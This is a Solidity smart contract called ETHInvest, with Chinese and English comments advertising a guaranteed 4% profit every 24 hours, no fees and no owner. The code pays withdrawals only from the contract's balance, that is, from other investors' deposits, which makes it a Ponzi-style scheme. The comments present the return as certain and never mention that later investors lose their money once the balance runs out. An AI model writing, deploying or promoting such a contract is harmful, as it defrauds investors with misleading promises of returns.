pragma solidity ^0.4.24;

/**
 * ETH投资合约
 *  - 获得 4% 利润每 24 小时
 *  - 你的投资无任何佣金(每笔交易都在合约余额上)
 *  - 创建者不收取任何费用，本质上根本就没有管理员(请查看代码)
 *
 * 如何使用：
 *  1. 发送你要投入数量的以太币
 *  2. 发送 0 以太币到合约提取你的利润 / 保留与增加以太币获得更多利润
 *
 * 发送以太币GAS设置：70000
 * GAS价格查看：https://ethgasstation.info/
 *
 * ETHInvest Contract
 *  - GAIN 4% PER 24 HOURS (every 5900 blocks) 
 *  - NO COMMISSION on your investment (every ether stays on contract&#39;s balance)
 *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)
 *
 * How to use: 
 *  1. Send any amount of ether to make an investment
 *  2. Claim your profit by sending 0 ether transaction (every day, every week, i don&#39;t care unless you&#39;re spending too much on GAS)
 *  OR /  Send more ether to reinvest AND get your profit at the same time
 *
 * RECOMMENDED GAS LIMIT: 70000
 * RECOMMENDED GAS PRICE: https://ethgasstation.info/
 *
 */
contract ETHInvest {
    // records amounts invested
    mapping (address => uint256) invested;
    // records blocks at which investments were made
    mapping (address => uint256) atBlock;

    // this function called every time anyone sends a transaction to this contract
    function () external payable {
        // if sender (aka YOU) is invested more than 0 ether
        if (invested[msg.sender] != 0) {
            // calculate profit amount as such:
            // amount = (amount invested) * 4% * (blocks since last transaction) / 5900
            // 5900 is an average block count per day produced by Ethereum blockchain
            uint256 amount = invested[msg.sender] * 4 / 100 * (block.number - atBlock[msg.sender]) / 5900;

            // send calculated amount of ether directly to sender (aka YOU)
            address sender = msg.sender;
            sender.transfer(amount);
        }

        // record block number and invested amount (msg.value) of this transaction
        atBlock[msg.sender] = block.number;
        invested[msg.sender] += msg.value;
    }
}